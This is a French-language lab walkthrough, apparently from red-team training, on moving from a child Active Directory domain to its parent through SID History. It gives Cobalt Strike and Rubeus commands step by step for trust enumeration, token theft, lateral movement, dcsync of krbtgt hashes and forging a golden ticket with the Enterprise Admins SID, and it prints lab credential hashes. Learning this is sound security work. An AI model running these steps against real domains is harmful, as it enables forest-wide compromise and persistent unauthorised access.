# Lab — Relations de confiance parent-enfant  

>L’objectif de ce lab est de passer d’un **domaine enfant** à son **domaine parent**.

## Énumération

1. Lancer **Cobalt Strike** et se connecter au **team server**.
2. Interagir avec le **Beacon** et énumérer la **trust**.

```Beacon-nocolor
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
```

**Résultats attendus :**
 
    > - `trustDirection=3` : relation bidirectionnelle (`TRUST_DIRECTION_BIDIRECTIONAL`)
    > - `trustAttributes=32` : relation interne à la forêt (`TRUST_ATTRIBUTE_WITHIN_FOREST`)

3. Récupérer le **SID** du domaine enfant.

```Beacon-nocolor
ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
```

**Résultat attendu :** *S-1-5-21-690277740-3036021016-2883941857*.

4. Récupérer le **SID** du groupe **Enterprise Admins** du domaine parent.

```Beacon-nocolor
ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
```
	
**Résultat attendu :** *S-1-5-21-3926355307-1661546229-813047887-519*.

===

## Récupération des identifiants (Credential Access)

1. Effectuer une **impersonation** de l’utilisateur *sguest*.

```
ps
process_browser
steal_token 6268
getuid
krb_triage
ls \\dub-dc-1\c$
```

**Contexte :** dans le lab, cet utilisateur est Domain Admin du domaine enfant Dublin.

## Lateral Movement vers Dublin  

```
jump winrm64 dub-dc-1 smb
```

## Privilege Escalation et Persistence

1. Passer au **Beacon** `dub-dc-1`.
2. Récupérer le **hash AES256** du compte `krbtgt` du domaine enfant.

```
krb_triage
dcsync dublin.contoso.com DUBLIN\krbtgt
```

> Sortie de `dcsync`

```
<snip>


Object Security ID   : S-1-5-21-690277740-3036021016-2883941857-502
Credentials
      aes256_hmac       (4096) : 2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9
<snip>
```

## Générer et utiliser un Golden Ticket

1. Depuis l’**Attacker Desktop**, générer un **Golden Ticket** dans un fichier `.kirbi` à l’aide du terminal PowerShell.

```Terminal-nocolor
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden
```

<img src="/images/powershell_Rubeus_golden_dublin_output.png">  

2. Injecter le **Golden Ticket** dans la session Beacon.

```Beacon-nocolor
kerberos_ticket_use C:\Users\Attacker\Desktop\golden_2026_04_29_06_43_02_Administrator_to_krbtgt@DUBLIN.CONTOSO.COM
```

**Attention :** cette opération remplace le TGT courant de `sguest`.

3. Vérifier la présence du ticket dans la session.
```
getuid
run klist
krb_triage
```

4. Accéder au **Domain Controller** du domaine parent.
```
ls \\lon-dc-1\c$
```

## Lateral Movement de Dublin vers Londres  

> Charger le fichier CNA dans le **Script Manager** `C:\Tools\SCShell\CS-BOF\scshell.cna` avant d’utiliser `scshell64`  
```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-dc-1 smb
```
  
## Domain Dominance dans la forêt  

```
getuid
dcsync contoso.com CONTOSO\krbtgt
```

> Sortie de DCSync :  
```
** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 24/01/2025 14:50:53
Object Security ID   : S-1-5-21-3926355307-1661546229-813047887-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 2d454c2120b54890b3db65406e5a5974
    ntlm- 0: 2d454c2120b54890b3db65406e5a5974
    lm  - 0: 6666c48c4b440676cfda7be586409948

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 1a8b1df83c2cdbeadba591130490e21d

* Primary:Kerberos-Newer-Keys *
    Default Salt : CONTOSO.COMkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c
```

<img src="/images/Parent-Child-Trusts-dcsync-contoso-krbtgt.png">  

**Bilan :** le lab illustre la manière dont SID History et les tickets Kerberos interviennent dans les relations de confiance parent-enfant.

